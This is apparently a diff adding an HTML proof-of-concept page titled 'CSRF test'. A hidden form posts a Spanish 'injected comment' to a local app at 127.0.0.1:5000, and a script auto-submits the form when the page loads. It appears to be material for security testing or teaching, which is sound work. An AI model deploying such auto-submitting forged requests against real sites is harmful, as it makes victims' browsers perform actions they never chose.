@@ -1,0 +1,17 @@
+<!doctype html>
+<html>
+  <body>
+    <h1>CSRF test</h1>
+
+    <form action="http://127.0.0.1:5000/submit_comment" method="POST" id="csrfForm">
+      <input type="hidden" name="comment" value="Comentario inyectado vía CSRF">
+    </form>
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+
+</html>
+
+
+
